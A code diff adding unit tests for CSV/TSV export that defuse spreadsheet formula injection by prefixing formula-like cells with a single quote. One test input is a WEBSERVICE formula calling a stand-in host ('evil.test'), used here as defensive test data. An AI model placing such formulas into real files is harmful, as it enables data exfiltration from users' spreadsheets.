@@ -74,6 +74,35 @@ describe('toCsv / toDelimited', () => {
     expect(toDelimited(columns, rows, ',')).toBe(toCsv(columns, rows));
     expect(toDelimited(columns, rows, '\t')).toBe(toTsv(columns, rows));
   });
+
+  // Issue #180: RFC-4180 quoting does not stop a spreadsheet evaluating a leading =/+/-/@ cell
+  // as a formula on open (the CSV-injection / DDE vector). A string cell that would open as a
+  // formula is prefixed with a single quote so it stays literal text.
+  it('neutralises a formula-triggering string cell with a leading single quote', () => {
+    const col = [{ header: 'x', value: (r: { x: string }) => r.x }];
+    const cell = (x: string) => toCsv(col, [{ x }]).split('\r\n')[1];
+    expect(cell('=1+1')).toBe("'=1+1");
+    expect(cell('+1')).toBe("'+1");
+    expect(cell('-cmd')).toBe("'-cmd");
+    expect(cell('@SUM(A1)')).toBe("'@SUM(A1)");
+    // A dangerous cell that also carries the delimiter is neutralised *and* RFC-4180 quoted.
+    expect(cell('=WEBSERVICE("http://evil.test"),x')).toBe('"\'=WEBSERVICE(""http://evil.test""),x"');
+    // A benign cell is untouched; a trigger only mid-cell is harmless and left alone.
+    expect(cell('plain')).toBe('plain');
+    expect(cell('a=b')).toBe('a=b');
+  });
+
+  it('leaves a leading-minus number cell as a value, not neutralised text', () => {
+    // Numbers are the app's own figures — a spreadsheet reads -5 as the value, not a formula —
+    // so they are exempt from the quote-prefix that a formula-shaped string gets.
+    const col = [{ header: 'n', value: (r: { n: number }) => r.n }];
+    expect(toCsv(col, [{ n: -5 }]).split('\r\n')[1]).toBe('-5');
+  });
+
+  it('neutralises formula cells in TSV too', () => {
+    const tsv = toTsv([{ header: 'x', value: (r: { x: string }) => r.x }], [{ x: '=1+1' }]);
+    expect(tsv.split('\r\n')[1]).toBe("'=1+1");
+  });
 });
 
 describe('toJson', () => {
